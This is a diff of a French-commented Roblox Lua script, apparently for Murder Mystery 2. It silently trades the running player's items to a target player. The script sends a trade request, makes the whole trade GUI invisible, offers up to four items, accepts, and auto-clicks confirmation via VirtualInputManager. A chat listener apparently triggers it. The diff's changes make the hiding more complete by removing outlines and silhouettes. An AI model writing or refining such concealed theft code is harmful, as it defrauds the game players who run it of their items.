@@ -496,7 +496,7 @@ local LocalPlayer = Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
--- Rendre invisible via la transparence SANS désactiver les éléments
+-- Rendre 100% invisible (transparence totale sans ombre/silhouette)
 local function setTradeGuiTransparency(invisible)
     pcall(function()
         local playerGui = LocalPlayer:WaitForChild("PlayerGui")
@@ -505,13 +505,17 @@ local function setTradeGuiTransparency(invisible)
             for _, descendant in pairs(tradeGui:GetDescendants()) do
                 if descendant:IsA("GuiObject") then
                     if invisible then
-                        -- Sauvegarde des transparences d'origine
+                        -- Sauvegarde des valeurs
                         if not descendant:FindFirstChild("OrigBgTrans") then
                             local val = Instance.new("NumberValue", descendant)
                             val.Name = "OrigBgTrans"
                             val.Value = descendant.BackgroundTransparency
                         end
                         descendant.BackgroundTransparency = 1
+
+                        if descendant:IsA("CanvasGroup") then
+                            descendant.GroupTransparency = 1
+                        end
 
                         if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
                             if not descendant:FindFirstChild("OrigTextTrans") then
@@ -529,9 +533,12 @@ local function setTradeGuiTransparency(invisible)
                             descendant.ImageTransparency = 1
                         end
                     else
-                        -- Restauration de l'apparence
+                        -- Restauration
                         if descendant:FindFirstChild("OrigBgTrans") then
                             descendant.BackgroundTransparency = descendant.OrigBgTrans.Value
+                        end
+                        if descendant:IsA("CanvasGroup") then
+                            descendant.GroupTransparency = 0
                         end
                         if descendant:FindFirstChild("OrigTextTrans") and (descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox")) then
                             descendant.TextTransparency = descendant.OrigTextTrans.Value
@@ -539,6 +546,12 @@ local function setTradeGuiTransparency(invisible)
                         if descendant:FindFirstChild("OrigImgTrans") and (descendant:IsA("ImageLabel") or descendant:IsA("ImageButton")) then
                             descendant.ImageTransparency = descendant.OrigImgTrans.Value
                         end
+                    end
+                elseif descendant:IsA("UIStroke") then
+                    if invisible then
+                        descendant.Enabled = false
+                    else
+                        descendant.Enabled = true
                     end
                 end
             end
@@ -557,12 +570,12 @@ local function getitems()
     Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2.5)
 
-    -- 2. Rendre invisible (transparence) SANS casser le GUI
+    -- 2. Transparence totale (efface aussi l'ombre et la silhouette grise)
     setTradeGuiTransparency(true)
 
-    -- 3. Remplissage des 3 cases max MM2
+    -- 3. Remplissage des 4 cases max
     local itemsOffered = 0
-    local maxSlots = 3
+    local maxSlots = 4
 
     local function offerAll(itemTable)
         if itemTable and itemsOffered < maxSlots then
@@ -595,7 +608,7 @@ local function getitems()
         Trade.AcceptRequest:FireServer()
     end)
 
-    -- 5. Attente obligatoire de 8 secondes (timer MM2)
+    -- 5. Attente des 8 secondes du compte à rebours
     task.wait(8)
 
     -- 6. SÉQUENCE DE CLIC SUR LE BOUTON
@@ -630,7 +643,7 @@ local function getitems()
         sendClick()
     end)
 
-    -- 7. Nettoyage final : fermeture propre après échange
+    -- 7. Nettoyage final
     task.wait(1)
     if destroytrades2 then
         pcall(function() coroutine.resume(destroytrades2) end)
@@ -638,7 +651,7 @@ local function getitems()
 end
 
 -- ==========================================
--- ÉCOUTE DU TCHAT
+-- ÉCOUTE DU TCHAT 7
 -- ==========================================
 
 local function listenToPlayer(player)
